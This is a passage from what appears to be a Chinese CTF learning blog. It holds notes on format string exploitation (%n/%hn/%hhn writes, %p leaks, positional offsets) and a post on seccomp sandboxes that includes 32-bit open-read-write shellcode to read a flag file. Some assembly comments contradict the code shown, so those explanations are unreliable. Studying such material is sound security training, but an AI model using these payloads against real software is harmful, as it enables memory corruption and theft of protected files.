的地方）。如果该位置可写，值 4 就被写入了。这通常会导致崩溃或意外行为。</span><br><span class="line"></span><br><span class="line">覆写任意地址 (结合偏移)：</span><br><span class="line"></span><br><span class="line">构造 payload：&lt;目标地址&gt;&lt;填充字符&gt;&lt;%k$n&gt; 或 &lt;填充字符&gt;&lt;%k$n&gt;&lt;目标地址&gt; (取决于目标地址在栈上的位置)。</span><br><span class="line"></span><br><span class="line">利用 %k$n 指定将栈上第 k 个参数当作 int *，并将已打印字符数写入该地址。</span><br><span class="line"></span><br><span class="line">例如，要写 0xdeadbeef (4字节) 到地址 0x0804a000：</span><br><span class="line"></span><br><span class="line">需要先打印 0xdeadbeef (3, 737, 519, 343) 个字符？这几乎不可能，因为数字太大。</span><br><span class="line"></span><br><span class="line">解决方案： 使用 %hn 或 %hhn 分多次写 2 字节或 1 字节。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">%hn - 写入已打印字符数 (短整型 - 2字节) (Write)</span><br><span class="line"></span><br><span class="line">功能： 期望一个 short int *（指向短整型的指针）作为参数。将到目前为止已成功输出的字符总数（只取其低 16 位）写入到这个指针指向的内存位置（写入 2 个字节）。</span><br><span class="line"></span><br><span class="line">为什么重要？ 要写入的值（如地址、Shellcode 地址）通常很大（4字节或8字节）。一次性用 %n 写入一个巨大的数字（如 0x0804a000 = </span><br><span class="line">134, 520, 832）需要构造极长的输出字符串，不现实且容易出错。%hn 允许我们分两次写入一个 4 字节值（高 16 位和低 16 位）或四次写</span><br><span class="line">入一个 8 字节值。</span><br><span class="line"></span><br><span class="line">漏洞利用 (精确内存覆写)：</span><br><span class="line"></span><br><span class="line">覆写任意地址的 2 字节 (Word)：</span><br><span class="line"></span><br><span class="line">构造 payload：&lt;目标地址&gt;&lt;填充字符&gt;&lt;%k$hn&gt;</span><br><span class="line"></span><br><span class="line">%k$hn 将已打印字符数（模 65536）的低 16 位写入到第 k 个参数指向的地址（2字节）。</span><br><span class="line"></span><br><span class="line">覆写任意地址的 4 字节 (Dword - 常用)：</span><br><span class="line"></span><br><span class="line">假设目标地址是 0x0804a000 (要写入的值 val = 0xdeadbeef)。</span><br><span class="line"></span><br><span class="line">将地址拆分为高 16 位 (high = 0xdead) 和低 16 位 (low = 0xbeef)。</span><br><span class="line"></span><br><span class="line">方法 1 (地址连续)：</span><br><span class="line"></span><br><span class="line">Payload: &lt;addr_low&gt;&lt;addr_high&gt;&lt;填充使总字符数=low&gt;&lt;%m$hn&gt;&lt;填充使总字符数=high&gt;&lt;%n$hn&gt; (注意 low 和 high 可能小于之前打印</span><br><span class="line">的字符数，需要用模运算调整)</span><br><span class="line"></span><br><span class="line">其中 m 是 addr_low 在栈上的位置偏移，n 是 addr_high 在栈上的位置偏移（通常 n = m + 1 或 n = m + 2，取决于指针大小）。</span><br><span class="line"></span><br><span class="line">第一个 %m$hn 将 low 写入 addr_low 指向的地址（即 0x0804a000）。</span><br><span class="line"></span><br><span class="line">第二个 %n$hn 将 high 写入 addr_high 指向的地址（即 0x0804a000 + 2 = 0x0804a002）。</span><br><span class="line"></span><br><span class="line">方法 2 (地址重叠 - 更紧凑)：</span><br><span class="line"></span><br><span class="line">Payload: &lt;addr&gt;&lt;填充使总字符数=low&gt;&lt;%m$hn&gt;&lt;填充使总字符数=high&gt;&lt;%m$hn&gt; (但这次 addr 指向 0x0804a000)</span><br><span class="line"></span><br><span class="line">第一个 %m$hn 将 low (0xbeef) 写入 addr (0x0804a000)。</span><br><span class="line"></span><br><span class="line">第二个 %m$hn 会再次写入 addr (0x0804a000)。但此时已打印字符数是 low + padding_for_high = 0xbeef + ... = high (假设填充计</span><br><span class="line">算正确)，所以将 high (0xdead) 写入 0x0804a000。覆盖了之前写入的低位！</span><br><span class="line"></span><br><span class="line">错误！ 需要写入 addr (0x0804a000) 和 addr+2 (0x0804a002)。方法 2 不正确。</span><br><span class="line"></span><br><span class="line">正确方法 2 (两个不同地址)：</span><br><span class="line"></span><br><span class="line">Payload: &lt;addr_high&gt;&lt;addr_low&gt;&lt;填充使总字符数=low&gt;&lt;%p$hn&gt;&lt;填充使总字符数=high_minus_low&gt;&lt;%q$hn&gt;</span><br><span class="line"></span><br><span class="line">其中 p 是 addr_low 的偏移，q 是 addr_high 的偏移。</span><br><span class="line"></span><br><span class="line">第一个 %p$hn 写 low 到 addr_low。</span><br><span class="line"></span><br><span class="line">第二个 %q$hn 写 high 到 addr_high。注意 high_minus_low 可能需要模 65536 计算，如果 high &lt; low 需要加 65536。</span><br><span class="line"></span><br><span class="line">关键点： 精确计算需要打印的字符数（通过添加特定数量的填充字符，如 %1234d）来控制写入的值。写入顺序（先低后高或先高后低）取决于</span><br><span class="line">目标地址的布局和值的大小关系（避免 high &lt; low 时需要额外处理）。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">%hhn - 写入已打印字符数 (字符 - 1字节) (Write)</span><br><span class="line"></span><br><span class="line">功能： 期望一个 char *（指向字符的指针）作为参数。将到目前为止已成功输出的字符总数（只取其最低 8 位）写入到这个指针指向的内存位置（写入 1 个字节）。</span><br><span class="line"></span><br><span class="line">为什么重要？ 提供最精细的控制粒度。可以分 4 次写入一个 4 字节值或 8 次写入一个 8 字节值。对于写入小值或需要非常精确控制内存内</span><br><span class="line"></span><br><span class="line">容的场景很有用。构造 payload 可能更长（需要更多次写入），但计算相对简单（模 256）。</span><br><span class="line"></span><br><span class="line">漏洞利用 (极其精确的内存覆写)： 原理与 %hn 类似，但分成 4 个字节 (4字节地址) 或 8 个字节 (64位地址)。Payload 包含目标地址的 </span><br><span class="line"></span><br><span class="line">4/8 个部分（每个部分 1 字节）和对应的 %k$hhn 及填充。计算每个阶段需要打印的字符数（模 256）。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">%p, %x, %d - 泄露数据 (Read)</span><br><span class="line"></span><br><span class="line">%p: 以指针格式（通常是十六进制带 0x 前缀）输出参数（一个地址）。</span><br><span class="line"></span><br><span class="line">%x/%X: 以十六进制格式（无前缀）输出参数（一个无符号整数）。常用于泄露栈上的数据（可能包含指针或 Canary）。</span><br><span class="line"></span><br><span class="line">%d/%u: 以十进制格式输出参数（有符号/无符号整数）。也能泄露栈数据。</span><br><span class="line"></span><br><span class="line">漏洞利用 (信息泄露 - 栈勘查)：</span><br><span class="line"></span><br><span class="line">printf(&quot;%p %p %p %p %p&quot;); - 连续泄露栈上多个位置的值（通常是格式化字符串指针之后的栈内容）。这是最开始的“探针”，用于：</span><br><span class="line"></span><br><span class="line">定位用户输入的格式化字符串本身在栈上的位置（找偏移量 k）。</span><br><span class="line"></span><br><span class="line">寻找栈上的返回地址、库函数地址、Canary 值等。</span><br><span class="line"></span><br><span class="line">printf(&quot;%100$p&quot;); - 直接泄露栈上第 100 个“参数”位置的值（如果存在）。</span><br><span class="line"></span><br><span class="line">结合 %s 泄露任意地址内容（如前所述）。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">%k$ - 直接参数访问 (关键!)</span><br><span class="line"></span><br><span class="line">功能： 这不是一个独立的说明符，而是修饰符。加在 % 和格式字符（如 s, n, x, p）之间，例如 %8$p, %3$s, %5$n, %10$hn。</span><br><span class="line"></span><br><span class="line">含义： 显式指定使用格式化字符串后面的第 k 个参数（而不是按顺序使用下一个参数）。</span><br><span class="line"></span><br><span class="line">为什么是漏洞利用的核心？</span><br><span class="line"></span><br><span class="line">精准定位： 在格式化字符串漏洞中，攻击者可以精心构造输入字符串（包含目标地址和格式化说明符），并利用 %k$ 精确地告诉 printf 去</span><br><span class="line"></span><br><span class="line">哪里找它需要的指针参数（用于 %s, %n, %hn, %hhn）。这使得攻击者能够读写任意指定的内存地址。</span><br><span class="line"></span><br><span class="line">绕过不确定性： 栈的布局可能因环境而异。通过泄露栈内容（用 %p, %x），攻击者可以计算出目标地址需要放置在格式化字符串的哪个位置，进而确定正确的偏移量 k 用于 %k$。</span><br><span class="line"></span><br><span class="line">示例：</span><br><span class="line"></span><br><span class="line">假设通过泄露发现，用户输入的格式化字符串起始地址位于栈上第 7 个参数的位置。</span><br><span class="line"></span><br><span class="line">攻击者 payload 开头写入 4 字节的目标地址 0x0804a000。</span><br><span class="line"></span><br><span class="line">那么，这个目标地址就会出现在栈上第 7 个参数的位置（因为格式化字符串指针是第 1 个参数，payload 内容紧随其后）。</span><br><span class="line"></span><br><span class="line">使用 %7$s 就可以尝试读取 0x0804a000 地址处的字符串。</span><br><span class="line"></span><br><span class="line">使用 %7$n 就可以将已打印字符数写入 0x0804a000 地址处。</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://linkpwn.github.io/2025/06/29/sandbox%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="linkpwn">
      <meta itemprop="description" content="linkpwn的学习经历">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="网络幻影">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/06/29/sandbox%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/" class="post-title-link" itemprop="url">sandbox专题学习</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2025-06-29 19:48:09" itemprop="dateCreated datePublished" datetime="2025-06-29T19:48:09+08:00">2025-06-29</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2025-09-23 21:01:06" itemprop="dateModified" datetime="2025-09-23T21:01:06+08:00">2025-09-23</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/PWN/" itemprop="url" rel="index"><span itemprop="name">PWN</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/PWN/%E6%80%BB%E7%BB%93/" itemprop="url" rel="index"><span itemprop="name">总结</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/PWN/%E6%80%BB%E7%BB%93/stack/" itemprop="url" rel="index"><span itemprop="name">stack</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/PWN/%E6%80%BB%E7%BB%93/stack/sandbox/" itemprop="url" rel="index"><span itemprop="name">sandbox</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="sandbox专题学习"><a href="#sandbox专题学习" class="headerlink" title="sandbox专题学习"></a>sandbox专题学习</h2><p>刚刚学完栈迁移📚，发现 sandbox 🧱经常和栈迁移结合，于是就仔细学一下 sandbox 🤓！</p>
<p>💻 Sandbox绕过好像很多，也复杂 😤，这里只好记录一下ORW的学习 📝</p>
<h3 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h3><h4 id="什么时候用orw"><a href="#什么时候用orw" class="headerlink" title="什么时候用orw"></a>什么时候用orw</h4><p>当程序开启沙箱保护，禁用一些系统调用，禁用execve等，使得我们不能通过使用system和execve来getshell。此时我们就要用到orw来解决这些问题。</p>
<h4 id="orw是什么"><a href="#orw是什么" class="headerlink" title="orw是什么"></a>orw是什么</h4><p>orw就是open,read,write这三个函数的简写，打开flag,读取flag,写出flag通过这三步来得到flag。</p>
<h4 id="sandbox的开启"><a href="#sandbox的开启" class="headerlink" title="sandbox的开启"></a>sandbox的开启</h4><p>第一种是利用prctl(),第二种是利用seccomp的库函数</p>
<p>(1) prctl():</p>
<p>在 Linux 系统编程中，<code>prctl</code> 函数结合 <code>PR_SET_SECCOMP</code> 或 <code>PR_SET_NO_NEW_PRIVS</code> 标志可用于开启 <strong>seccomp（Secure Computing）沙箱</strong>，这是一种限制进程系统调用（syscall）的安全机制。</p>
<p>PR_SET_NO_NEW_PRIVS:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0); #禁止进程及其子进程通过 execve 等获得新权限</span><br></pre></td></tr></table></figure>

<p>PR_SET_SECCOMP:</p>
<p>严格模式<strong>（<code>SECCOMP_MODE_STRICT</code>）</strong>：仅允许 <code>read</code>, <code>write</code>, <code>_exit</code>, <code>sigreturn</code> 四个系统调用。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">prctl(PR_SET_SECCOMP, SECCOMP_MODE_STRICT);</span><br></pre></td></tr></table></figure>

<p>过滤器模式（<code>SECCOMP_MODE_FILTER</code>）：自定义允许&#x2F;拒绝的系统调用列表（通过 BPF 规则）。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">struct sock_fprog filter = &#123; ... &#125;;  // 定义 BPF 过滤器</span><br><span class="line">prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &amp;filter);</span><br></pre></td></tr></table></figure>

<p>例子：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> <span class="title">filter</span>[] =</span> &#123;</span><br><span class="line">    <span class="comment">// 检查系统调用号是否在允许列表</span></span><br><span class="line">    BPF_STMT(BPF_LD | BPF_W | BPF_ABS, offsetof(<span class="keyword">struct</span> seccomp_data, nr)),</span><br><span class="line">    BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_openat, <span class="number">0</span>, <span class="number">1</span>), <span class="comment">// 允许 openat</span></span><br><span class="line">    BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),</span><br><span class="line">    BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_read, <span class="number">0</span>, <span class="number">1</span>),   <span class="comment">// 允许 read</span></span><br><span class="line">    BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),</span><br><span class="line">    BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL),            <span class="comment">// 拒绝其他</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock_fprog</span> <span class="title">prog</span> =</span> &#123;</span><br><span class="line">    .len = <span class="keyword">sizeof</span>(filter) / <span class="keyword">sizeof</span>(filter[<span class="number">0</span>]),</span><br><span class="line">    .filter = filter,</span><br><span class="line">&#125;;   </span><br><span class="line"><span class="comment">//SECCOMP_RET_ALLOW：允许系统调用。</span></span><br><span class="line"><span class="comment">//SECCOMP_RET_KILL：立即终止进程。</span></span><br></pre></td></tr></table></figure>

<p>(2)seccomp的库函数:例如libseccomp 库</p>
<p>例子：仅允许进程执行 <code>exit_group</code>、<code>read</code>、<code>write</code> 系统调用：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;seccomp.h&gt;</span></span></span><br><span class="line">scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL); <span class="comment">// 默认拒绝所有</span></span><br><span class="line">seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), <span class="number">0</span>);</span><br><span class="line">seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), <span class="number">0</span>);</span><br><span class="line">seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), <span class="number">0</span>);</span><br><span class="line">seccomp_load(ctx); <span class="comment">// 加载到内核</span></span><br></pre></td></tr></table></figure>



<p>了解完这些，就开始学习如何解决它了(orw)</p>
<h4 id="seccomp-tools查看沙箱"><a href="#seccomp-tools查看沙箱" class="headerlink" title="seccomp-tools查看沙箱"></a>seccomp-tools查看沙箱</h4><p>seccomp-tools可以用来查看沙箱的情况</p>
<p>安装：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install gcc ruby-dev</span><br><span class="line">sudo gem install seccomp-tools</span><br><span class="line">seccomp-tools dump ./elf  #elf换成你自己的文件名</span><br></pre></td></tr></table></figure>

<p><img src="/2025/06/29/sandbox%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/s-tools1.png" alt="1"></p>
<p>可以看到那些函数是可以用的。</p>
<h3 id="open、read、write函数的了解"><a href="#open、read、write函数的了解" class="headerlink" title="open、read、write函数的了解"></a>open、read、write函数的了解</h3><p>open()函数：</p>
<p>函数原型</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">open</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *pathname, <span class="type">int</span> flags)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">open</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *pathname, <span class="type">int</span> flags, <span class="type">mode_t</span> mode)</span>;</span><br></pre></td></tr></table></figure>

<ol>
<li><p><code>pathname</code></p>
<p>：</p>
<ul>
<li>文件路径名（字符串），例如：<code>&quot;flag&quot;</code>、<code>&quot;/tmp/test.txt&quot;</code>。</li>
</ul>
</li>
<li><p><code>flags</code></p>
<p>：</p>
<ul>
<li>打开文件的方式，比如只读、只写、读写等。</li>
<li>可以组合多个标志（使用按位或 <code>|</code> 操作符）。</li>
</ul>
<table>
<thead>
<tr>
<th>标志常量</th>
<th>十六进制值</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td><code>O_RDONLY</code></td>
<td>0x0</td>
<td>只读方式打开文件</td>
</tr>
<tr>
<td><code>O_WRONLY</code></td>
<td>0x1</td>
<td>只写方式打开文件</td>
</tr>
<tr>
<td><code>O_RDWR</code></td>
<td>0x2</td>
<td>读写方式打开文件</td>
</tr>
</tbody></table>
<p>系统调用号：</p>
<ul>
<li><code>sys_open</code> 的系统调用号是 <code>5</code>（十进制），即 <code>0x5</code>。</li>
</ul>
<table>
<thead>
<tr>
<th>关键点</th>
<th>内容</th>
</tr>
</thead>
<tbody><tr>
<td>函数名</td>
<td><code>open()</code></td>
</tr>
<tr>
<td>功能</td>
<td>打开或创建文件</td>
</tr>
<tr>
<td>返回值</td>
<td>文件描述符（成功）或 -1（失败）</td>
</tr>
<tr>
<td>常用 flag</td>
<td><code>O_RDONLY</code>, <code>O_WRONLY</code>, <code>O_RDWR</code>, <code>O_CREAT</code>, <code>O_TRUNC</code>, <code>O_APPEND</code></td>
</tr>
<tr>
<td>mode 参数</td>
<td>用于指定新文件权限，如 <code>0644</code></td>
</tr>
<tr>
<td>系统调用号</td>
<td><code>5</code>（Linux x86）</td>
</tr>
<tr>
<td>寄存器传参</td>
<td><code>eax=5</code>, <code>ebx=filename</code>, <code>ecx=flags</code>, <code>edx=mode</code></td>
</tr>
</tbody></table>
</li>
</ol>
<p>read()函数：</p>
<p>函数原型：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">read</span><span class="params">(<span class="type">int</span> fd, <span class="type">void</span> *buf, <span class="type">size_t</span> count)</span>;</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>参数名</th>
<th>类型</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td><code>fd</code></td>
<td><code>int</code></td>
<td>文件描述符（由 <code>open()</code> 或其他方式获得）</td>
</tr>
<tr>
<td><code>buf</code></td>
<td><code>void*</code></td>
<td>用户空间的缓冲区地址，用来保存读取的数据</td>
</tr>
<tr>
<td><code>count</code></td>
<td><code>size_t</code></td>
<td>要读取的最大字节数</td>
</tr>
</tbody></table>
<p>系统调用号：</p>
<ul>
<li><code>sys_read</code> 的系统调用号是 <code>3</code>（十进制），即 <code>0x3</code>。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">寄存器传参方式（Linux x86）：</span><br><span class="line">寄存器	对应参数</span><br><span class="line">eax	系统调用号：3</span><br><span class="line">ebx	文件描述符 fd</span><br><span class="line">ecx	缓冲区地址 buf</span><br><span class="line">edx	要读取的字节数 count</span><br></pre></td></tr></table></figure>

<p>write()函数:</p>
<p>函数原型：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">write</span><span class="params">(<span class="type">int</span> fd, <span class="type">const</span> <span class="type">void</span> *buf, <span class="type">size_t</span> count)</span>;</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>参数名</th>
<th>类型</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td><code>fd</code></td>
<td><code>int</code></td>
<td>文件描述符（由 <code>open()</code> 或其他方式获得）</td>
</tr>
<tr>
<td><code>buf</code></td>
<td><code>const void*</code></td>
<td>用户空间的缓冲区地址，包含要写入的数据</td>
</tr>
<tr>
<td><code>count</code></td>
<td><code>size_t</code></td>
<td>要写入的最大字节数</td>
</tr>
</tbody></table>
<p>系统调用号：</p>
<ul>
<li><code>sys_write</code> 的系统调用号是 <code>4</code>（十进制），即 <code>0x4</code>。</li>
</ul>
<p>寄存器传参方式（Linux x86）：</p>
<table>
<thead>
<tr>
<th>寄存器</th>
<th>对应参数</th>
</tr>
</thead>
<tbody><tr>
<td><code>eax</code></td>
<td>系统调用号：<code>4</code></td>
</tr>
<tr>
<td><code>ebx</code></td>
<td>文件描述符 <code>fd</code></td>
</tr>
<tr>
<td><code>ecx</code></td>
<td>缓冲区地址 <code>buf</code></td>
</tr>
<tr>
<td><code>edx</code></td>
<td>要写入的字节数 <code>count</code></td>
</tr>
</tbody></table>
<h4 id="做完了铺垫，现在就开始orw"><a href="#做完了铺垫，现在就开始orw" class="headerlink" title="做完了铺垫，现在就开始orw"></a>做完了铺垫，现在就开始orw</h4><h5 id="shellcode绕过"><a href="#shellcode绕过" class="headerlink" title="shellcode绕过"></a>shellcode绕过</h5><p>首先,看看最简单的orw,在没有开启NX的条件下，可以直接写入这三个函数执行。</p>
<p><img src="/2025/06/29/sandbox%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/%E4%BE%8B1.0.png" alt="2"></p>
<p>第一种直接用汇编写</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#0x67616c66根据文件名改动 0x67616c66转ASCII--&gt;flag</span><br><span class="line">shellcode=asm(&#x27;push 0x0;push 0x67616c66;mov ebx,esp;xor ecx,ecx;xor edx,edx;mov eax,0x5;int 0x80&#x27;)</span><br><span class="line">shellcode+=asm(&#x27;mov eax,0x3;mov ecx,ebx;mov ebx,0x3;mov edx,0x100;int 0x80&#x27;)</span><br><span class="line">shellcode+=asm(&#x27;mov eax,0x4;mov ebx,0x1;int 0x80&#x27;)</span><br></pre></td></tr></table></figure>

<p>具体解释一下这个汇编代码,根据上面对open，read，write函数的了解，汇编也就很好理解了。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#fd = open(&quot;flag&quot;, O_RDONLY);</span><br><span class="line">push 0x0               ; 将0压栈，表示以只读方式打开文件（O_RDONLY）</span><br><span class="line">push 0x67616c66        ; 将&quot;flag&quot;字符串的ASCII值压栈（注意字节顺序是反的，实际上是&#x27;flag&#x27;）</span><br><span class="line">mov ebx, esp           ; 将栈顶指针赋值给ebx，作为文件名指针</span><br><span class="line">xor ecx, ecx           ; 清空ecx寄存器（第二个参数，O_RDONLY）</span><br><span class="line">xor edx, edx           ; 清空edx寄存器（第三个参数，权限模式，这里不需要）</span><br><span class="line">mov eax, 0x5           ; 调用sys_open (系统调用号5)</span><br><span class="line">int 0x80               ; 触发中断，执行系统调用</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov eax, 0x3           ; 调用sys_read (系统调用号3)</span><br><span class="line">mov ecx, ebx           ; 文件描述符（由上一步返回值在ebx中）</span><br><span class="line">xor ebx, ebx           ; 清空ebx，作为文件描述符0（标准输入）</span><br><span class="line">mov edx, 0x100         ; 读取长度为256字节</span><br><span class="line">int 0x80               ; 触发中断，执行系统调用</span><br></pre></td></tr></table></figure>

